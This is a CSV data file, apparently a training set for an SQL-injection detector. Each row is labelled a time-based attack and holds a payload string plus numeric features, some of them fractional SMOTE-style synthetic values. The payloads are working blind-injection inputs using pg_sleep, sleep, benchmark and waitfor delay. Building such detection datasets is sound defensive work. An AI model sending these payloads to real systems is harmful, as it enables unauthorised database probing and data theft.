id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000272,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000190,0.8260405546391165,80.89350243631495,25.642913255331734,3.661327279646022,29.036022904324536,10.0,31.571653021326938,10.285826510663469,0.35718470044436856,0.1254392743143929,0.39091175074276974,0.12646427449846878,3.4643698829976013,0.0,0.0,0.0,0.0,1.821456627665867,0.0,4.0,0.0,0.9999999999999999,0.0,1.821456627665867,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.8214566276658668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8214566276658672
SMOTE_000273,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,1.9404983984997568,70.2887282138425,18.830982571074,3.0870925202038366,20.3732369283055,5.661965142148,33.253526143389,11.0,0.28946298852976765,0.07865354013665976,0.47519048389446455,0.1566929874391081,4.0,0.0,0.0,0.0,0.0,1.4577456427685,0.0,5.0845087144629995,0.0,0.0,0.45774564276850016,1.4577456427685,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,1.4129991030932905,71.76948410467726,25.0,3.638784008507858,24.38474205233863,10.0,27.692371026169315,9.692371026169315,0.3396563564033727,0.139429255301415,0.3859435239188796,0.13497086437633263,3.384742052338632,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.6923710261693159,1.6152579476613682,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3076289738306841,0.0,0.3076289738306841,0.0,1.0,0.6923710261693159,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.307628973830684
SMOTE_000275,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.2182162791740242,97.06579593791892,22.06579593791892,3.165251692659857,36.26318375167568,1.0,45.86840812416216,13.93420406208108,0.3735703945032043,0.01030235683379771,0.4725656401114516,0.14356160855154637,3.0,0.0,0.0,0.0,1.0,0.9342040620810795,0.0,9.0,0.0,0.0,0.0,1.9342040620810796,1.0,0.0,0.0,0.0,0.0,0.9342040620810795,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000276,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000208,0.0935175101458338,85.03872342924898,28.077446858497947,3.6902846091970583,25.0,18.0,33.0,9.038723429248973,0.2939852139902566,0.21166935407298476,0.3880604824671387,0.10628494946961997,0.0,0.038723429248972985,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.038723429248973096,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000277,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000141,1.8055295122292923,77.68501733411864,23.25833746050444,3.479172981583947,28.561672444706215,6.86500742890799,31.60666996840355,10.651667492100888,0.3682916581695497,0.08210945921249868,0.4108384881044828,0.13876039451346883,3.651667492100888,0.0,0.0,0.0,0.0,1.6516674921008878,0.0,4.348332507899112,0.0,0.9999999999999999,0.0,1.651667492100888,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6516674921008879,1.6516674921008878,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3033349842017756
SMOTE_000278,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000170,0.10851926611412277,56.442195896658774,19.031585421189913,3.1997569480757466,21.968414578810087,1.0315854211899111,25.34743963308904,8.094756263569737,0.3899242108895081,0.018195558084177624,0.44857186786645836,0.14330836315985587,3.031585421189912,0.0,0.0,0.0,0.0,1.0,0.0,4.063170842379825,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9684145788100875,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9684145788100875
SMOTE_000279,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.9462921310219854,98.64576631253689,27.29153262507377,3.6856512366441443,26.0,21.645766312536885,38.0,13.0,0.2635755592531479,0.21941084375029274,0.3852258173699854,0.13178777962657395,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.645766312536886,0.354233687463114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000176,0.029233912490177483,73.87543413399098,17.990418010306996,2.5207320048038215,12.971254030920994,2.0,43.92334408245598,14.980836020613996,0.17556317114449954,0.02708221792911343,0.5945521400545282,0.20280247087185893,0.0,4.0,0.0,0.0,0.0,1.0,0.0,7.980836020613996,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.009581989693002002,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.009581989693002
SMOTE_000281,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.7879063815139723,65.62003695340663,23.189981523296687,3.4228954747258133,19.189981523296687,10.0,28.620036953406622,7.810018476703312,0.2925563632629867,0.15241468524288204,0.43606566460133644,0.11896328689279488,0.8100184767033113,0.18998152329668871,0.0,0.0,0.0,1.0,0.0,4.810018476703311,0.0,0.9999999999999999,0.0,1.0,0.8100184767033114,0.1899815232966888,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.18998152329668883,0.8100184767033112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000264,0.4292649406526706,94.73366030153576,27.433415075383945,3.6533346897260044,28.30024522615183,18.0,38.43341507538394,10.0,0.2980555980413129,0.1902923797720788,0.40593403342434237,0.10571798876226599,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000283,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000046,0.6204604026106546,66.23455097477351,19.691362256306622,2.885336867797289,10.0,10.0,35.23455097477351,11.0,0.1510935318288216,0.1510935318288216,0.5316100513306531,0.16620288501170377,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.308637743693378,0.691362256306622,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000186,0.9741180544334329,86.26002803541121,23.0,3.032065271461934,30.0,2.0,43.383356696176016,10.876671339235203,0.3494224291700071,0.023294828611333807,0.5013820256218265,0.1259007165968325,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.876671339235202,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000161,0.7353393390807074,64.0,22.76228021277953,3.3868325988443866,18.0,10.0,28.0,8.0,0.28125,0.15625,0.4375,0.125,0.76228021277953,0.23771978722047005,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.7622802127795301,0.23771978722047016,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,0.7818733146087425,65.42015340177652,23.420153401776513,3.518768187392418,19.0,10.0,27.0,9.420153401776513,0.29044687304574507,0.15286677528723425,0.41274029327553247,0.1439460583914883,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.0,0.4201534017765135,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000287,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,1.2353286994169577,93.72669714283514,22.532385306119306,3.105934589022962,32.25908244895444,1.0,46.0,14.467614693880694,0.3430664261634039,0.010684227131404905,0.4914744480446258,0.15477489866056535,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.4676146938806952,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000288,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,0.06143262086691897,89.0,27.212548307474755,3.859791005422396,26.0,22.0,30.0,11.0,0.29213483146067415,0.24719101123595505,0.33707865168539325,0.12359550561797752,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000308,1.006293734476118,73.36626776251651,25.316866118741743,3.606664510073564,16.366267762516518,19.633732237483486,28.0,9.366267762516516,0.22294993664854384,0.2678185244155338,0.3817088030498381,0.1275227358860843,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.6831338812582586,0.0,1.0,1.0,1.0,0.0,0.0,0.6831338812582586,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.42501092813605296,55.3987834266812,22.8006082866594,3.7720572911401034,23.0,3.900304143329701,17.498479283351497,11.0,0.4153553100728297,0.07054594581707513,0.31545055233613306,0.19864819177396206,5.601216573318803,0.2990875700108967,0.0,0.0,0.0,1.0,0.0,2.099695856670299,0.0,0.0,0.0,1.0,1.0,0.09969585667029893,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000291,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000212,1.2355494165590977,89.45279288123447,19.419445606248804,2.838058228980289,27.0,2.0,47.19445606248805,13.258336818746416,0.3033596701284572,0.022471086676182,0.5263701786151097,0.14779906458025102,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.838891212497611,0.41944560624880534,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000292,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000014,0.9818475410990064,94.23001201567831,26.0,3.643734466135707,24.72742925803876,16.909717032155044,36.54686332234885,16.046002403135663,0.267087309999034,0.178333612673791,0.384969854845499,0.169609222481676,3.8637146290193805,0.0,0.0,0.0,0.0,1.8637146290193807,0.0,5.591143887058141,0.0,0.0,0.8637146290193805,5.591143887058141,1.0,0.0,0.0,0.13628537098061932,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.13628537098061955,0.8637146290193806,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000293,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R000266,0.4584800869465032,87.38307395536079,22.0,3.036437101819263,28.0,1.0,43.90645916428863,14.476614791072157,0.32068940251632655,0.011453192947011664,0.5022169833776968,0.16564042115896502,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.476614791072157,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000294,attack,time,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000248,0.3255619775888059,67.8318964806758,22.0,3.344542310307976,19.0,10.0,30.19324706722983,8.638649413445966,0.2819066543723602,0.14837192335387378,0.44262060183479907,0.12710082043896698,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.638649413445966,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000295,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.28090788222237534,92.41690199514946,26.208450997574726,3.6029071101075334,26.0,18.0,35.41690199514945,13.0,0.2813814026410908,0.19480250952075517,0.3831253865176086,0.1406907013205454,2.895774501212636,0.0,0.0,0.0,0.0,2.0,0.0,5.104225498787364,0.0,0.0,1.0,3.1042254987873634,1.0,0.0,0.0,0.8957745012126366,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000177,1.7943293890671723,71.24220930877196,24.414069769590654,3.6200594712168312,23.24220930877196,10.0,27.414069769590654,10.585930230409346,0.3259542165990321,0.14042620487520163,0.3848229417875739,0.14879663673819232,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.4140697695906533,2.1718604608186936,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5859302304093468,0.0,0.5859302304093468,0.0,0.4140697695906533,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.585930230409347
SMOTE_000297,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.3680197635256752,59.75823380076018,24.251176257251455,3.5855294154895545,19.0,10.0,23.507057543508726,7.251176257251455,0.31872508164073116,0.16775004296880588,0.392235595200738,0.12128928018972496,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.2511762572514544,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,0.47987093916538387,87.42790942627266,27.0,3.5281660209588974,23.0,15.0,36.94232754101813,12.485581885254533,0.263288638326239,0.17170998151711242,0.42223804066235265,0.14276333949429584,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.4855818852545335,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000299,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,1.2991018403549657,85.23900378034745,27.380498109826277,3.7578987089920055,33.09750945086862,10.0,31.76099621965255,10.380498109826275,0.38801504436081685,0.11733249753551017,0.372790221165469,0.12186223693820393,0.0,4.0,0.0,0.0,0.0,1.3804981098262752,0.0,4.0,0.0,0.9999999999999999,0.0,1.3804981098262752,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6195018901737246,0.38049810982627524,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000300,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,2.3930487769018507,78.0,27.0,3.61277393759521,22.0,10.0,33.0,13.0,0.28205128205128205,0.1282051282051282,0.4230769230769231,0.16666666666666666,1.9684146171070895,2.03158538289291,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.9999999999999999,0.0,2.0,0.49210365427677244,0.5078963457232277,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000301,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000254,0.4170025813848181,63.826625472679844,21.826625472679844,3.348938651129571,18.0,10.0,28.0,7.826625472679844,0.2820239934255364,0.15667999634752022,0.43870398977305664,0.1225920204538867,0.0,0.8266254726798432,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.0,0.8266254726798433,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000121,0.014577732700017219,78.0746709826224,24.0,3.274344608021688,19.0,10.0,37.059736786097915,12.014934196524477,0.24337059798118235,0.1280897884111486,0.4746519374356825,0.1538876761719865,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.014934196524478,1.0,0.9999999999999999,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,0.4518047928244013,95.41665625671301,25.43452009168322,3.2276121089910115,24.66071205500993,10.0,46.86904018336644,13.886904018336644,0.25856075803231127,0.10505942583938267,0.49065922214188545,0.1457205939864206,0.0,4.0,0.0,0.0,0.0,1.1130959816633568,0.0,7.7738080366732865,0.0,0.0,1.0,1.1130959816633568,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1130959816633565,0.8869040183366433,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
